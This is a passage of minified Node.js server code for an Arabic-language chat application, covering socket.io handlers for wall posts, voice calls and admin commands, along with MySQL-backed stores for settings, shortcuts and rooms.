                    type: "YOUR_POST_IS_REMOVED",
                    data: e
                }))
            }
            this.store.ordersReg.wallRemove(this.user, null), this.register({
                body: e.body,
                type: e.type
            }, "remove")
        }).catch(e => {})
    }, o.prototype.removeComment = function(e) {
        const t = parseInt(e.id),
            s = parseInt(e.postId);
        isNaN(t) || isNaN(s) || this.store.wall.get(s).then(e => {
            (e == this.user.reg_id || this.user.can("wall_remove", this.handler)) && this.store.wall.removeComment(t, s).then(e => {
                this.handler(r.enc({
                    error: !1
                })), this.store.io.emit("res", r.enc({
                    type: "POST_COMMENT_DELETED",
                    data: {
                        post_id: e.postId
                    }
                }))
            }).catch(e => {})
        }).catch(e => {})
    }, o.prototype.isValidType = function(e) {
        return ["text", "photo", "sound", "video", "youtube"].includes(e)
    }, o.prototype.register = function(e, t) {
        const s = this;
        return new Promise((r, o) => {
            s.store.db.query("INSERT INTO wallReg (byRealName, byNickName, msg, msgType, actionType, created_at, updated_at) VALUES (?,?,?,?,?,?,?)", [s.user.name, s.user.getUsername(), e.body, e.type, t, new Date, new Date], (e, t) => {
                e && o(e), r(t)
            })
        })
    }, e.exports = o
}, function(e, t, s) {
    const r = s(0);

    function o(e, t, s, o) {
        switch (this.socket = t, this.user = s, this.store = o, this.handler = e.handler, r.check(o, t), e.type) {
            case "REQUEST_MIC":
                return this.requestMic(e.data);
            case "STOP_SOUND":
                return this.stopSound(e.data);
            default:
                return null
        }
    }
    o.prototype.requestMic = function(e) {
        e && "boolean" != typeof e.on || (e.on ? this.store.radio.requestMic(this.user) : this.store.radio.unRequestMic(this.user))
    }, o.prototype.stopSound = function(e) {
        if (e && "boolean" != typeof e.on) return;
        this.user.micStatus.soundOff = e.on;
        const t = {
            micStatus: this.user.micStatus
        };
        this.store.io.emit("res", r.enc({
            type: "USER_UPDATED",
            data: {
                id: this.user.id,
                reg_id: this.user.reg_id,
                updates: t
            }
        }))
    }, e.exports = o
}, function(e, t, s) {
    const r = s(0),
        o = s(5);

    function i(e, t, s, o) {
        switch (this.socket = t, this.user = s, this.store = o, this.handler = e.handler, r.check(o, t), e.type) {
            case "CALL_REQUEST":
                return this.callRequest(e.data);
            case "CALL_REQUEST_CANCEL":
                return this.callRequestCancel(e.data);
            case "CALL_REQUEST_ACCEPT":
                return this.callRequestAccept(e.data);
            default:
                return null
        }
    }
    i.prototype.callRequest = function(e) {
        const t = this.findUser(e.id);
        if (!t) return this.handler(r.enc("هذا المستخدم غير متواجد الآن"));
        if (this.user.callStatus != o.READY) return this.handler(r.enc({
            user: {},
            message: "not ready"
        }));
        if (t.callStatus == o.TALKING) return this.handler(r.enc({
            user: {},
            message: "هذا المستخم مشغول حاليا,الرجاء إعادة المحاولة لاحقا"
        }));
        if (t.callStatus == o.RIGHNING) return this.handler(r.enc({
            user: {},
            message: "لا يمكن إجراء هذه المكالمة الآن, الرجاء إعادة المحاولة لاحقا"
        }));
        if (t.callStatus == o.CALLING) return this.handler(r.enc({
            user: {},
            message: "لا يمكن إجراء هذه المكالمة الآن, الرجاء إعادة المحاولة لاحقا"
        }));
        if (t.callStatus == o.OFFLINE) return this.handler(r.enc({
            user: {},
            message: "لا يمكن إجراء هذه المكالمة الآن, الرجاء إعادة المحاولة لاحقا"
        }));
        if (t.callStatus == o.READY) {
            const e = {
                id: this.user.id,
                username: this.user.getUsername(),
                avatar: this.user.getAvatar()
            };
            t.callStatus = o.RIGHNING, t.socket.emit("res", r.enc({
                type: "CALL_REQUESTED",
                data: {
                    caller: e
                }
            })), t.callUserId = this.user.id;
            const s = {
                id: t.id,
                username: t.getUsername(),
                avatar: t.getAvatar()
            };
            return this.user.callStatus = o.CALLING, this.handler(r.enc({
                user: s,
                message: "rigning"
            }))
        }
    }, i.prototype.callRequestCancel = function(e) {
        const t = this.findUser(e.id);
        if (t) return t.socket.emit("res", r.enc({
            type: "CALL_REQUEST_CANCELLED",
            data: {}
        })), this.user.callStatus = o.READY, t.callStatus = o.READY, t.callUserId = null, this.user.callUserId = null, this.handler()
    }, i.prototype.callRequestAccept = function(e) {
        const t = this.findUser(e.id);
        if (!t) return;
        const s = {
            id: this.user.id,
            username: this.user.getUsername(),
            avatar: this.user.getAvatar()
        };
        return t.socket.emit("res", r.enc({
            type: "CALL_REQUEST_ACCEPTED",
            data: {
                caller: s
            }
        })), this.user.callStatus = o.TALKING, t.callStatus = o.TALKING, this.user.callUserId = t.id, t.callUserId = this.user.id, this.handler(r.enc(t.id))
    }, i.prototype.findUser = function(e) {
        let t = this.store.users.filter(t => t.id == e)[0];
        return t || this.store.usersReg.filter(t => t.id == e)[0]
    }, e.exports = i
}, function(e, t, s) {
    const r = s(0),
        o = s(1);

    function i(e, t, s) {
        if (this.socket = t, this.store = s, this.handler = e.handler, r.check(s, t), this.isValidToken(e.data.token)) switch (e.type) {
            case "ADMIN_ROOM_CREATE":
                return this.createRoom(e.data);
            case "ADMIN_ROOM_UPDATE":
                return this.updateRooms(e.data);
            case "ADMIN_ROOM_UPDATE_FLAG":
                return this.updateRoomFlag(e.data);
            case "ADMIN_ROOM_DELETE":
                return this.deleteRoom(e.data);
            case "ADMIN_ROOMS_SET_DEFAULT_FLAG":
                return this.setDefaultRoomFlag(e.data);
            case "ADMIN_BANNEDS_CLEAR":
                return this.clearBanneds(e.data);
            case "ADMIN_ROLES_RESET":
                return this.resetRoles(e.data);
            case "ADMIN_ROLE_CHANGE_ICON":
                return this.changeRoleIcon(e.data);
            case "ADMIN_ROLE_REMOVE_ICON":
                return this.removeRoleIcon(e.data);
            case "ADMIN_PERMISSIONS_RESET":
                return this.resetPermissions(e.data);
            case "ADMIN_WORDS_ADD":
                return this.filterAddWord(e.data);
            case "ADMIN_WORDS_UPDATE_TYPE":
                return this.filterUpdateWordType(e.data);
            case "ADMIN_WORDS_REMOVE":
                return this.filterRemoveWord(e.data);
            case "ADMIN_WORDS_RESET":
                return this.filterResetWords(e.data);
            case "ADMIN_USERS_UPDATE_ROLE":
                return this.usersUpdateRole(e.data);
            case "ADMIN_USERS_SET_DEFAULT_AVATAR":
                return this.usersSetDefaultAvatar(e.data);
            case "ADMIN_VIRTUAL_USERS_ADD":
                return this.addVirtualUser(e.data);
            case "ADMIN_VIRTUAL_USERS_DELETE":
                return this.deleteVirtualUser(e.data);
            case "ADMIN_VIRTUAL_USERS_LOGOUT":
                return this.logoutVirtualUser(e.data);
            case "ADMIN_RESET_FACES":
                return this.resetFaces(e.data);
            case "ADMIN_RESET_GIFTS":
                return this.resetGifts(e.data);
            case "ADMIN_SELF_MESSAGES_ADD":
                return this.addSelfMessage(e.data);
            case "ADMIN_SELF_MESSAGES_UPDATE":
                return this.updateSelfMessages(e.data);
            case "ADMIN_SELF_MESSAGES_DELETE":
                return this.deleteSelfMessage(e.data);
            case "ADMIN_SHORTCUTS_ADD":
                return this.addShortcut(e.data);
            case "ADMIN_SHORTCUTS_UPDATE":
                return this.updateShortcut(e.data);
            case "ADMIN_SHORTCUTS_REMOVE":
                return this.removehortcut(e.data);
            case "ADMIN_RESET_SETTINGS":
                return this.resetSettings(e.data);
            default:
                return null
        }
    }
    i.prototype.createRoom = function(e) {
        if (e && e.room) {
            if (r.isXSS(e.room.name) || r.isXSS(e.room.description) || r.isXSS(e.room.welcome)) return;
            const t = this.store.rooms.add(e.room);
            t && this.store.users.forEach(e => {
                e.socket.emit("res", r.enc({
                    type: "NEW_ROOM_CREATED",
                    data: {
                        room: t.parse(e, this.store.users)
                    }
                }))
            })
        }
    }, i.prototype.updateRooms = function(e) {
        if (e && Array.isArray(e.rooms)) {
            const t = [];
            e.rooms.forEach(e => {
                if (!r.isXSS(e.name) && !r.isXSS(e.description) && !r.isXSS(e.welcome)) {
                    const s = this.store.rooms.edit(e);
                    s && t.push(s.parse())
                }
            }), t.length && this.store.io.emit("res", r.enc({
                type: "ROOMS_UPDATED",
                data: {
                    rooms: t
                }
            }))
        }
    }, i.prototype.updateRoomFlag = function(e) {
        if (e && e.id && e.flag) {
            if (r.isXSS(e.flag)) return;
            const t = this.store.rooms.all().filter(t => t.id == e.id)[0];
            t && (t.flag = e.flag, this.store.users.forEach(e => {
                this.store.io.emit("res", r.enc({
                    type: "ADMIN_ROOM_FLAG_UPDATED",
                    data: {
                        room: t.parse(e, this.store.users)
                    }
                }))
            }))
        }
    }, i.prototype.deleteRoom = function(e) {
        if (e && Array.isArray(e.deleteds)) {
            const t = [];
            e.deleteds.forEach(e => {
                (e = this.store.rooms.remove(e)) && t.push(e)
            }), t.length && this.store.io.emit("res", r.enc({
                type: "ADMIN_ROOM_DELETED",
                data: {
                    ids: t
                }
            }))
        }
    }, i.prototype.setDefaultRoomFlag = function(e) {
        if (e && e.flag) {
            this.store.settings.set("default_rooms_flag", e.flag), this.store.rooms.all().filter(e => null == e.flag).map(e => e.parse()).length && this.store.users.forEach(e => {
                const t = this.store.rooms.all().filter(e => null == e.flag).map(t => t.parse(e, this.store.users));
                this.store.io.emit("res", r.enc({
                    type: "ROOMS_UPDATED",
                    data: {
                        rooms: t
                    }
                }))
            }), this.handler()
        }
    }, i.prototype.clearBanneds = function(e) {
        e && (e.isTruncated ? (this.store.bannedIps = [], this.store.bannedDevices = []) : (e.ip && (this.store.bannedIps = this.store.bannedIps.filter(t => t != e.ip)), e.device && (this.store.bannedDevices = this.store.bannedDevices.filter(t => t != e.device))))
    }, i.prototype.resetRoles = function(e) {
        e && this.store.permissions.resetRoles()
    }, i.prototype.changeRoleIcon = function(e) {
        if (e && e.role && e.icon) {
            this.store.roles.changeIcon(e.role, e.icon), this.store.users.filter(t => t.role == e.role).forEach(e => {
                if (e instanceof o) {
                    const t = {
                        icon: e.getIcon()
                    };
                    this.store.io.emit("res", r.enc({
                        type: "USER_UPDATED",
                        data: {
                            id: e.id,
                            reg_id: e.reg_id,
                            updates: t
                        }
                    }))
                }
            })
        }
    }, i.prototype.removeRoleIcon = function(e) {
        if (e && e.role) {
            this.store.roles.removeIcon(e.role), this.store.users.filter(t => t.role == e.role).forEach(e => {
                if (e instanceof o) {
                    const t = {
                        icon: e.getIcon()
                    };
                    this.store.io.emit("res", r.enc({
                        type: "USER_UPDATED",
                        data: {
                            id: e.id,
                            reg_id: e.reg_id,
                            updates: t
                        }
                    }))
                }
            })
        }
    }, i.prototype.resetPermissions = function(e) {
        e && e.roleID && this.store.permissions.updateRole(e.roleID)
    }, i.prototype.filterAddWord = function(e) {
        e && e.word && this.store.wordsFilter.addWord(e.word)
    }, i.prototype.filterUpdateWordType = function(e) {
        e && e.word && this.store.wordsFilter.updateWord(e.word)
    }, i.prototype.filterRemoveWord = function(e) {
        e && e.id && this.store.wordsFilter.removeWord(e.id)
    }, i.prototype.filterResetWords = function(e) {
        this.store.wordsFilter.init().then(e => {
            this.handler()
        }).catch(e => {})
    }, i.prototype.usersUpdateRole = function(e) {
        if (e && e.role && e.user_id) {
            const t = this.store.users.filter(t => t.reg_id == e.user_id)[0];
            if (t) {
                const s = this.store.roles.getRoleName(e.role);
                s && (t.role = e.role, t.socket.emit("res", r.enc({
                    type: "PROFILE_ACTION_CHANGE_ROLE",
                    data: {
                        user: null,
                        roleName: s
                    }
                })), this.store.io.emit("res", r.enc({
                    type: "USER_UPDATED",
                    data: {
                        id: t.id,
                        reg_id: t.reg_id,
                        updates: {
                            role: t.role,
                            power: t.getPower(),
                            icon: t.getIcon()
                        }
                    }
                })))
            }
        }
    }, i.prototype.usersSetDefaultAvatar = function(e) {
        if (e && e.avatar) {
            this.store.settings.set("default_avatar", e.avatar);
            const t = [];
            this.store.users.filter(e => null == e.avatar).forEach(e => {
                t.push({
                    id: e.id,
                    reg_id: e.reg_id,
                    updates: {
                        avatar: e.getAvatar()
                    }
                })
            }), t.length && this.store.io.emit("res", r.enc({
                type: "USERS_UPDATED",
                data: {
                    updates: t
                }
            }))
        }
    }, i.prototype.addVirtualUser = function(e) {
        e && e.user && this.store.virtualUsers.add(e.user)
    }, i.prototype.deleteVirtualUser = function(e) {
        e && Array.isArray(e.deleteds) && e.deleteds.forEach(e => {
            this.store.virtualUsers.remove(e)
        })
    }, i.prototype.logoutVirtualUser = function(e) {
        e && Array.isArray(e.ids) && (e.ids.forEach(e => {
            var t = this.store.users.filter(t => t.isVirtual && t.reg_id == e)[0];
            t instanceof o && t.logout()
        }), this.handler())
    }, i.prototype.resetFaces = function(e) {
        this.store.faces.init().then(e => {
            this.store.io.emit("res", r.enc({
                type: "RESET_FACES",
                data: {
                    faces: e
                }
            }))
        }).catch(e => {})
    }, i.prototype.resetGifts = function(e) {
        this.store.gifts.init().then(e => {
            this.store.io.emit("res", r.enc({
                type: "RESET_GIFTS",
                data: {
                    gifts: e
                }
            }))
        }).catch(e => {})
    }, i.prototype.addSelfMessage = function(e) {
        if (e && e.message) {
            if (r.isXSS(e.message.title) || r.isXSS(e.message.msg)) return;
            this.store.selfMessages.add(e.message)
        }
    }, i.prototype.updateSelfMessages = function(e) {
        e && Array.isArray(e.messages) && e.messages.forEach(e => {
            r.isXSS(e.title) || r.isXSS(e.msg) || this.store.selfMessages.edit(e)
        })
    }, i.prototype.deleteSelfMessage = function(e) {
        e && Array.isArray(e.deleteds) && e.deleteds.forEach(e => {
            this.store.selfMessages.remove(e)
        })
    }, i.prototype.addShortcut = function(e) {
        e && e.shortcut && this.store.shortcuts.add(e.shortcut)
    }, i.prototype.updateShortcut = function(e) {
        e && Array.isArray(e.shortcuts) && (e.shortcuts.forEach(e => {
            this.store.shortcuts.edit(e)
        }), this.handler())
    }, i.prototype.removehortcut = function(e) {
        e && e.ids && this.store.shortcuts.remove(e.ids)
    }, i.prototype.resetSettings = function(e) {
        this.store.settings.init().then(() => {
            this.store.io.emit("res", r.enc({
                type: "SET_SETTINGS",
                data: {
                    settings: this.store.settings.parse()
                }
            }))
        }).catch(e => {})
    }, i.prototype.isValidToken = function(e) {
        return !!this.store.adminTokens.filter(t => t == e)[0]
    }, e.exports = i
}, function(e, t) {
    e.exports = require("child_process")
}, function(e, t, s) {
    const r = s(0),
        o = s(1);

    function i(e, t, s) {
        if (this.socket = t, this.store = s, this.handler = e.handler, r.check(s, t), this.isValidAdminHash(e.data.admin_hash)) switch (e.type) {
            case "ADMIN_ROOM_CREATE":
                return this.createRoom(e.data);
            case "ADMIN_ROOM_UPDATE":
                return this.updateRooms(e.data);
            case "ADMIN_ROOM_UPDATE_FLAG":
                return this.updateRoomFlag(e.data);
            case "ADMIN_ROOM_DELETE":
                return this.deleteRoom(e.data);
            case "ADMIN_ROOMS_SET_DEFAULT_FLAG":
                return this.setDefaultRoomFlag(e.data);
            case "ADMIN_BANNEDS_CLEAR":
                return this.clearBanneds(e.data);
            case "ADMIN_ROLES_RESET":
                return this.resetRoles(e.data);
            case "ADMIN_ROLE_CHANGE_ICON":
                return this.changeRoleIcon(e.data);
            case "ADMIN_PERMISSIONS_RESET":
                return this.resetPermissions(e.data);
            case "ADMIN_WORDS_ADD":
                return this.filterAddWord(e.data);
            case "ADMIN_WORDS_UPDATE_TYPE":
                return this.filterUpdateWordType(e.data);
            case "ADMIN_WORDS_REMOVE":
                return this.filterRemoveWord(e.data);
            case "ADMIN_WORDS_RESET":
                return this.filterResetWords(e.data);
            case "ADMIN_WALL_CLEAR":
                return this.clearWall(e.data);
            case "ADMIN_USERS_UPDATE_ROLE":
                return this.usersUpdateRole(e.data);
            case "ADMIN_USERS_SET_DEFAULT_AVATAR":
                return this.usersSetDefaultAvatar(e.data);
            case "ADMIN_VIRTUAL_USERS_ADD":
                return this.addVirtualUser(e.data);
            case "ADMIN_VIRTUAL_USERS_DELETE":
                return this.deleteVirtualUser(e.data);
            case "ADMIN_VIRTUAL_USERS_LOGOUT":
                return this.logoutVirtualUser(e.data);
            case "ADMIN_RESET_FACES":
                return this.resetFaces(e.data);
            case "ADMIN_RESET_GIFTS":
                return this.resetGifts(e.data);
            case "ADMIN_SELF_MESSAGES_ADD":
                return this.addSelfMessage(e.data);
            case "ADMIN_SELF_MESSAGES_UPDATE":
                return this.updateSelfMessages(e.data);
            case "ADMIN_SELF_MESSAGES_DELETE":
                return this.deleteSelfMessage(e.data);
            case "ADMIN_SHORTCUTS_ADD":
                return this.addShortcut(e.data);
            case "ADMIN_SHORTCUTS_UPDATE":
                return this.updateShortcut(e.data);
            case "ADMIN_SHORTCUTS_REMOVE":
                return this.removehortcut(e.data);
            case "ADMIN_RESET_SETTINGS":
                return this.resetSettings(e.data);
            default:
                return null
        }
    }
    i.prototype.createRoom = function(e) {
        if (e && e.room) {
            if (r.isXSS(e.room.name) || r.isXSS(e.room.description) || r.isXSS(e.room.welcome)) return;
            const t = this.store.rooms.add(e.room);
            t && this.store.users.forEach(e => {
                e.socket.emit("res", r.enc({
                    type: "NEW_ROOM_CREATED",
                    data: {
                        room: t.parse(e, this.store.users)
                    }
                }))
            })
        }
    }, i.prototype.updateRooms = function(e) {
        if (e && Array.isArray(e.rooms)) {
            const t = [];
            e.rooms.forEach(e => {
                if (!r.isXSS(e.name) && !r.isXSS(e.description) && !r.isXSS(e.welcome)) {
                    const s = this.store.rooms.edit(e);
                    s && t.push(s.parse())
                }
            }), t.length && this.store.io.emit("res", r.enc({
                type: "ROOMS_UPDATED",
                data: {
                    rooms: t
                }
            }))
        }
    }, i.prototype.updateRoomFlag = function(e) {
        if (e && e.id && e.flag) {
            if (r.isXSS(e.flag)) return;
            const t = this.store.rooms.all().filter(t => t.id == e.id)[0];
            t && (t.flag = e.flag, this.store.users.forEach(e => {
                this.store.io.emit("res", r.enc({
                    type: "ADMIN_ROOM_FLAG_UPDATED",
                    data: {
                        room: t.parse(e, this.store.users)
                    }
                }))
            }))
        }
    }, i.prototype.deleteRoom = function(e) {
        if (e && Array.isArray(e.deleteds)) {
            const t = [];
            e.deleteds.forEach(e => {
                (e = this.store.rooms.remove(e)) && t.push(e)
            }), t.length && this.store.io.emit("res", r.enc({
                type: "ADMIN_ROOM_DELETED",
                data: {
                    ids: t
                }
            }))
        }
    }, i.prototype.setDefaultRoomFlag = function(e) {
        if (e && e.flag) {
            this.store.settings.set("default_rooms_flag", e.flag), this.store.rooms.all().filter(e => null == e.flag).map(e => e.parse()).length && this.store.users.forEach(e => {
                const t = this.store.rooms.all().filter(e => null == e.flag).map(t => t.parse(e, this.store.users));
                this.store.io.emit("res", r.enc({
                    type: "ROOMS_UPDATED",
                    data: {
                        rooms: t
                    }
                }))
            }), this.handler()
        }
    }, i.prototype.clearBanneds = function(e) {
        e && (e.isTruncated ? (this.store.bannedIps = [], this.store.bannedDevices = []) : (e.ip && (this.store.bannedIps = this.store.bannedIps.filter(t => t != e.ip)), e.device && (this.store.bannedDevices = this.store.bannedDevices.filter(t => t != e.device))))
    }, i.prototype.resetRoles = function(e) {
        e && this.store.permissions.resetRoles()
    }, i.prototype.changeRoleIcon = function(e) {
        if (e && e.role && e.icon) {
            this.store.roles.changeIcon(e.role, e.icon), this.store.users.filter(t => t.role == e.role).forEach(e => {
                if (e instanceof o) {
                    const t = {
                        icon: e.getIcon()
                    };
                    this.store.io.emit("res", r.enc({
                        type: "USER_UPDATED",
                        data: {
                            id: e.id,
                            reg_id: e.reg_id,
                            updates: t
                        }
                    }))
                }
            })
        }
    }, i.prototype.resetPermissions = function(e) {
        e && e.roleID && this.store.permissions.updateRole(e.roleID)
    }, i.prototype.filterAddWord = function(e) {
        e && e.word && this.store.wordsFilter.addWord(e.word)
    }, i.prototype.filterUpdateWordType = function(e) {
        e && e.word && this.store.wordsFilter.updateWord(e.word)
    }, i.prototype.filterRemoveWord = function(e) {
        e && e.id && this.store.wordsFilter.removeWord(e.id)
    }, i.prototype.filterResetWords = function(e) {
        this.store.wordsFilter.init().then(e => {
            this.handler()
        }).catch(e => {})
    }, i.prototype.clearWall = function(e) {
        this.store.io.emit("res", r.enc({
            type: "CLEAR_WALL",
            data: {}
        }))
    }, i.prototype.usersUpdateRole = function(e) {
        if (e && e.role && e.user_id) {
            const t = this.store.users.filter(t => t.reg_id == e.user_id)[0];
            if (t) {
                const s = this.store.roles.getRoleName(e.role);
                s && (t.role = e.role, t.socket.emit("res", r.enc({
                    type: "PROFILE_ACTION_CHANGE_ROLE",
                    data: {
                        user: null,
                        roleName: s
                    }
                })), this.store.io.emit("res", r.enc({
                    type: "USER_UPDATED",
                    data: {
                        id: t.id,
                        reg_id: t.reg_id,
                        updates: {
                            role: t.role,
                            power: t.getPower(),
                            icon: t.getIcon()
                        }
                    }
                })))
            }
        }
    }, i.prototype.usersSetDefaultAvatar = function(e) {
        if (e && e.avatar) {
            this.store.settings.set("default_avatar", e.avatar);
            const t = [];
            this.store.users.filter(e => null == e.avatar).forEach(e => {
                t.push({
                    id: e.id,
                    reg_id: e.reg_id,
                    updates: {
                        avatar: e.getAvatar()
                    }
                })
            }), t.length && this.store.io.emit("res", r.enc({
                type: "USERS_UPDATED",
                data: {
                    updates: t
                }
            }))
        }
    }, i.prototype.addVirtualUser = function(e) {
        e && e.user && this.store.virtualUsers.add(e.user)
    }, i.prototype.deleteVirtualUser = function(e) {
        e && Array.isArray(e.deleteds) && e.deleteds.forEach(e => {
            this.store.virtualUsers.remove(e)
        })
    }, i.prototype.logoutVirtualUser = function(e) {
        e && Array.isArray(e.ids) && (e.ids.forEach(e => {
            var t = this.store.users.filter(t => t.isVirtual && t.reg_id == e)[0];
            t instanceof o && t.logout()
        }), this.handler())
    }, i.prototype.resetFaces = function(e) {
        this.store.faces.init().then(e => {
            this.store.io.emit("res", r.enc({
                type: "RESET_FACES",
                data: {
                    faces: e
                }
            }))
        }).catch(e => {})
    }, i.prototype.resetGifts = function(e) {
        this.store.gifts.init().then(e => {
            this.store.io.emit("res", r.enc({
                type: "RESET_GIFTS",
                data: {
                    gifts: e
                }
            }))
        }).catch(e => {})
    }, i.prototype.addSelfMessage = function(e) {
        if (e && e.message) {
            if (r.isXSS(e.message.title) || r.isXSS(e.message.msg)) return;
            this.store.selfMessages.add(e.message)
        }
    }, i.prototype.updateSelfMessages = function(e) {
        e && Array.isArray(e.messages) && e.messages.forEach(e => {
            r.isXSS(e.title) || r.isXSS(e.msg) || this.store.selfMessages.edit(e)
        })
    }, i.prototype.deleteSelfMessage = function(e) {
        e && Array.isArray(e.deleteds) && e.deleteds.forEach(e => {
            this.store.selfMessages.remove(e)
        })
    }, i.prototype.addShortcut = function(e) {
        e && e.shortcut && this.store.shortcuts.add(e.shortcut)
    }, i.prototype.updateShortcut = function(e) {
        e && Array.isArray(e.shortcuts) && (e.shortcuts.forEach(e => {
            this.store.shortcuts.edit(e)
        }), this.handler())
    }, i.prototype.removehortcut = function(e) {
        e && e.ids && this.store.shortcuts.remove(e.ids)
    }, i.prototype.resetSettings = function(e) {
        this.store.settings.init().then(() => {
            this.store.io.emit("res", r.enc({
                type: "SET_SETTINGS",
                data: {
                    settings: this.store.settings.parse()
                }
            }))
        }).catch(e => {})
    }, i.prototype.isValidToken = function(e) {
        return !!this.store.adminTokens.filter(t => t == e)[0]
    }, i.prototype.isValidAdminHash = function(e) {
        return this.store.config.adminHash == e
    }, e.exports = i
}, function(e, t) {
    e.exports = require("mysql")
}, function(e, t) {
    e.exports = require("empty-folder")
}, function(e, t) {
    e.exports = require("socket.io")
}, function(e, t, s) {
    const r = s(0);

    function o(e) {
        this.db = e.db, this.data = {}, this.init().catch(e => {})
    }
    o.prototype.init = function() {
        var e = this;
        return new Promise(function(t, s) {
            e.db.query("SELECT * FROM settings limit 1", [], function(r, o) {
                try {
                    !r && o && o.length ? (e.data = o[0], t(o[0])) : s(r)
                } catch (e) {
                    s(e)
                }
            })
        })
    }, o.prototype.getDefaultUserAvatar = function() {
        return this.data.default_avatar ? "/uploads/avatars/" + this.data.default_avatar : "/images/none.png"
    }, o.prototype.getDefaultRoomsFlag = function() {
        return this.data.default_rooms_flag ? "/uploads/rooms/" + this.data.default_rooms_flag : "/images/default_room.png"
    }, o.prototype.get = function(e) {
        return this.data[e]
    }, o.prototype.set = function(e, t) {
        if (!r.isXSS(t)) return this.data[e] = t
    }, o.prototype.parse = function() {
        return {
            chat_name: this.get("chat_name"),
            chat_background: this.get("chat_background"),
            background_color: this.get("background_color"),
            show_chat_background: this.get("show_chat_background"),
            show_chat_background_on_windows: this.get("show_chat_background_on_windows"),
            show_banner: this.get("show_banner"),
            banner_img: this.get("banner_img"),
            btn_color: this.get("btn_color"),
            window_color: this.get("window_color"),
            content_color: this.get("content_color"),
            border_color: this.get("border_color"),
            default_rooms_flag: this.get("default_rooms_flag"),
            marquee_bg_color: this.get("marquee_bg_color"),
            marquee_text_color: this.get("marquee_text_color"),
            marquee_content: this.get("marquee_content"),
            disable_marquee: this.get("disable_marquee"),
            show_wall_banner: this.get("show_wall_banner"),
            wall_banner_msg: this.get("wall_banner_msg"),
            wall_banner_background_color: this.get("wall_banner_background_color"),
            wall_banner_font_color: this.get("wall_banner_font_color"),
            self_messages_icon: this.get("self_messages_icon"),
            self_message_bg_color: this.get("self_message_bg_color"),
            self_message_title_color: this.get("self_message_title_color"),
            self_message_content_color: this.get("self_message_content_color"),
            disable_floating_particles: this.get("disable_floating_particles")
        }
    }, e.exports = o
}, function(e, t, s) {
    const r = s(0);

    function o(e) {
        this.db = e.db, this.init(), this.shortcuts = []
    }
    o.prototype.init = function() {
        var e = this;
        return new Promise(function(t, s) {
            e.db.query("SELECT * FROM shortcuts", [], function(r, o) {
                try {
                    if (!r && o && o.length) {
                        for (var i in e.shortcuts = [], o) {
                            var n = o[i];
                            e.shortcuts.push({
                                id: n.id,
                                key: n.key,
                                value: n.value
                            })
                        }
                        t(e.shortcuts)
                    } else s("no shortcuts found")
                } catch (e) {
                    s(e)
                }
            })
        })
    }, o.prototype.all = function() {
        return this.shortcuts
    }, o.prototype.keys = function() {
        return this.shortcuts.map(e => e.key)
    }, o.prototype.values = function() {
        return this.shortcuts.map(e => e.value)
    }, o.prototype.parse = function(e) {
        try {
            const t = e.split(" ");
            if (!t.length) return "";
            let s = "";
            return this.values().length ? (t.forEach(e => {
                if (e.trim().length) {
                    const t = this.keys().indexOf(e);
                    s += t >= 0 ? " " + this.values()[t] : " " + e
                }
            }), " " == s.charAt(0) ? s.replace(" ", "") : s) : e
        } catch (e) {
            return console.log(e.stack), ""
        }
    }, o.prototype.add = function(e) {
        return !!(e && e.id && e.key && e.value) && (!r.isXSS(e.key) && !r.isXSS(e.value) && (this.shortcuts.push({
            id: e.id,
            key: e.key,
            value: e.value
        }), !0))
    }, o.prototype.edit = function(e) {
        return !!(e && e.id && e.key && e.value) && (!r.isXSS(e.key) && !r.isXSS(e.value) && void(this.shortcuts = this.shortcuts.map(t => (t.id == e.id && (t.key = e.key, t.value = e.value), t))))
    }, o.prototype.remove = function(e) {
        return !!Array.isArray(e) && (e.forEach(e => {
            this.shortcuts = this.shortcuts.filter(t => t.id != e)
        }), !0)
    }, e.exports = o
}, function(e, t, s) {
    const r = s(37),
        o = s(0);

    function i(e) {
        this.settings = e.settings, this.db = e.db, this.shortcuts = e.shortcuts, this.rooms = [], this.init().catch(e => {}), this.defaultRoomsCount = 0
    }
    i.prototype.init = function() {
        var e = this;
        return new Promise(function(t, s) {
            e.db.query("SELECT * FROM rooms", [], function(i, n) {
                try {
                    if (!i && n && n.length) {
                        for (var a in n) {
                            const t = n[a];
                            t.default && e.defaultRoomsCount++, e.rooms.push(new r({
                                id: t.id,
                                name: t.name,
                                password: t.password,
                                welcome: o.sanitize(t.welcome, e.shortcuts),
                                description: t.description,
                                capacity: t.capacity,
                                default: t.default,
                                flag: t.flag,
                                target: t.target
                            }, e.settings))
                        }
                        t(e.rooms)
                    } else s(i)
                } catch (e) {
                    s(e)
                }
            })
        })
    }, i.prototype.getDefault = function(e, t) {
        const s = this.rooms.filter(s => !!s.default && !s.isFull(e, t)).sort((e, t) => e.id > t.id ? 1 : -1)[0];
        if (s) return s; {
            const e = this.rooms.filter(e => !!e.default).sort((e, t) => e.id > t.id ? 1 : -1)[0];
            this.defaultRoomsCount++;
            const t = new r({
                id: Date.now(),
                name: e.name + " ( " + this.defaultRoomsCount + " )",
                welcome: o.sanitize(e.welcome, this.shortcuts),
                description: e.description,
                default: !0
            }, this.settings);
            return this.rooms.push(t), t
        }
    }, i.prototype.getHeighestID = function() {
        let e = 0;
        return this.rooms.reduce((t, s) => t.id > s.id ? (e = t.id, t) : s.id > t.id ? (e = s.id, s) : void 0), e
    }, i.prototype.all = function() {
        return this.rooms
    }, i.prototype.get = function(e) {
        return this.rooms.filter(t => t.id == e)[0]
    }, i.prototype.insertToDB = function(e) {
        const t = this;
        return new Promise((s, r) => {
            t.db.query("INSERT INTO rooms (`name`, `password`, `welcome`, `description`, `capacity`) VALUES (?, ?, ?, ?, ?)", [e.name, e.password, e.welcome, e.description, e.capacity], (e, t) => {
                e && r(e), s(t)
            })
        })
    }, i.prototype.remvoeFromDB = function(e) {
        const t = this;
        return new Promise((s, r) => {
            t.db.query("DELETE FROM rooms WHERE id = ? AND `default` = 0", [e], (e, t) => {
                e && r(e), s(t)
            })
        })
    }, i.prototype.save = function(e) {
        const t = this;
        return new Promise((s, r) => {
            t.db.query("UPDATE rooms SET `name` = ?, `password` = ?, `welcome` = ?, `description` = ?, `capacity` = ? WHERE id = ?", [e.name, e.password, e.welcome, e.description, e.capacity, e.id], (e, t) => {
                e && r(e), s(t)
            })
        })
    }, i.prototype.add = function(e) {
        if (e && "object" == typeof e) {
            e.welcome = o.sanitize(e.welcome, this.shortcuts);
            const t = new r(e, this.settings);
            return t.removeWhenEmpty = "boolean" != typeof e.isPermanent || !e.isPermanent, this.rooms.push(t), t
        }
        return null
    }, i.prototype.edit = function(e) {
        if (e && "object" == typeof e) {
            let t = null;
